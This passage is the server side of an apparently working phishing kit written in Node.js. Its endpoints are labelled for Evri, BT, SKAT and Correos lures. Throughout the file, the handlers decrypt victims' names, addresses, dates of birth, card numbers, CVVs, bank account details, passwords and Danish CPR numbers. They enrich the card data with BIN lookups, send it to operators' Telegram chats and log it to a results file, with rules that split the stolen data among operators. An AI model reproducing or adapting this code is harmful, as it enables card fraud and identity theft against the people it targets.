app.options("/@skiii719", cors());

app.post("/@skiii719", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ssfinesse", cors());

app.post("/ssfinesse", (req, res) => {
  username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  mmn = CryptoJS.AES.decrypt(req.body.mmn, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ip = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nMMN: ${mmn}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
        );
        skiii719 = 0;
      } else if (bin === "535666" || bankName === "SANTANDER") {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
        );
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=BTSS:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=BT:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

//SKAT
//SKAT
//SKAT

let skat = 0;

app.options("/skatPersonal", cors());

app.post("/skatPersonal", (req, res) => {
  username = req.body.username;
  fullname = req.body.fullname;
  address = req.body.address;
  city = req.body.city;
  zip = req.body.zip;
  dob = req.body.dob;
  telephone = req.body.telephone;
  cpr = req.body.cpr;
  bank = req.body.bank;
  var originalText = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}`;

  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 680379375,
        text: `Skat\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });
  axios
    .post(
      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      {
        chat_id: 1449567433,
        text: `Skat\n${originalText}`,
        parse_mode: "Markdown",
      }
    )
    .catch((e) => {
      console.log(e);
    });

  var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n\n`;

  fs.appendFile("results.txt", resultsTxt, (err) => {
    if (err) {
      console.log(err);
    }
  });

  res.send("Update Completed");
});

app.options("/skatBilling", cors());

app.post("/skatBilling", (req, res) => {
  ccname = req.body.ccname;
  ccnum = req.body.ccnum;
  ccexp = req.body.ccexp;
  cccvv = req.body.cccvv;
  zip = req.body.zip;
  dob = req.body.dob;
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
      var originalText = `+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Skat\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1449567433,
            text: `Skat\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      var resultsTxt = `+----------- Login Information ------------+\nUsername: ${username}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nZIP: ${zip}\nPhone Number: ${telephone}\nCPR: ${cpr}\nBank: ${bank}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;

      fs.appendFile("results.txt", resultsTxt, (err) => {
        if (err) {
          console.log(err);
        }
      });

      res.send("Update Completed");
    })
    .catch((e) => {
      console.log(e);
    });
});

//CORREOS
//CORREOS
//CORREOS

app.options("/correosKelv", cors());

app.post("/correosKelv", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1248378980,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.options("/correosAK", cors());

app.post("/correosAK", (req, res) => {
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  addy = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 1374564725,
            text: `Correos\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.options("/removeips", cors());

app.post("/removeips", (req, res) => {
  ip = req.body.ip;

  content = ``;
  fs.writeFile("ips.txt", content, (err) => {
    if (err) {
      console.error(err);
    } else {
      res.send("Update Completed");
    }
  });
});

app.listen(port, () => console.log(`Started server at port ` + port));
